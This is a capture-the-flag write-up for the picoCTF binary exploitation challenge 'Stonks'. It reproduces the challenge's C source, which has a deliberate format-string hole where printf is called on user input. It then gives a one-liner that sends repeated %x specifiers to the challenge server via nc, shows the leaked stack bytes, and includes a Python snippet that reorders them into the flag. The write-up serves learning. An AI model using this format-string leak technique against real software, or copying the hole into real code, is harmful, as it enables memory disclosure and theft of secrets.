# Task 8 - Stonks

### Binary Exploitation. 😕

**Question**

1. They gave us this c code 🤡

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
```

2. What's wrong with this?

```
There is a vulnerability on line 93 😃
```

**Answers**

1. I just put the command which they gave ` nc mercury.picoctf.net 20195`

2.

```
(echo 1; for i in {1..50}; do echo -n "%${i}\$08x"; done; echo) |  nc mercury.picoctf.net 20195
```

3. It gave me this fcking huge token.

```
08bc53d00804b000080489c3f7f52d80ffffffff0000000108bc3160f7f60110f7f52dc70000000008bc41800000000108bc53b008bc53d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664ffb8007df7f8daf8f7f604405b8a52000000000100000000f7defbe9f7f610c0f7f525c0f7f52000ffb83b88f7de058df7f525c008048ecaffb83b9400000000f7f74f090804b000f7f52000f7f52e20ffb83bc8
```

4. Converted hex to ascii but got this.

```
ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ¸}
```

5. Wrote this python code.

```
 s = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ¸}'
>>> for x in range(0, len(s), 4):
     print(s[x+3]+s[x+2]+s[x+1]+s[x], end='')
```

6. Then got our flag.

```
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
```
